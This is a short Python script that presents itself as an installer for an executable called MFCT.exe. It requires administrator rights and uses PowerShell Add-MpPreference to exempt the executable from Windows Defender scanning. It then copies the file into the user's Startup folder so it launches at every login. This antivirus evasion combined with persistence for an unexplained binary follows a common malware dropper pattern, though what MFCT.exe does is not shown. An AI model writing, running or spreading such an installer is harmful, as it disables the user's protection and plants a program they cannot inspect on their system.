import os
import os.path
import shutil
import subprocess

try:
    import psutil
except ModuleNotFoundError:
    os.system("pip3 install psutil")

user = os.getlogin()

source = "MFCT.exe"
filePath = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
fullexPath = f"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/MFCT.exe"

def inexit():
    input("Press enter to exit.")
    exit()

try:
   subprocess.run([ "powershell", "-Command", f"Add-MpPreference -ExclusionPath '{fullexPath}'" ], check=True)
except subprocess.CalledProcessError:
    os.system("cls")
    print("Please re-run this with administrator permissions.")
    inexit()

try:  
    directory = os.path.dirname(filePath)

    os.makedirs(filePath, exist_ok=True)
    destination_path = os.path.join(filePath, os.path.basename(source))
    shutil.copy2(source, destination_path)
except FileNotFoundError:
    print("Error: MFCT.exe missing from root directory. Are you sure you extracted it properly?")
    inexit()

os.system("cls")
print(f"Installed successfully to {fullexPath}!")
inexit()
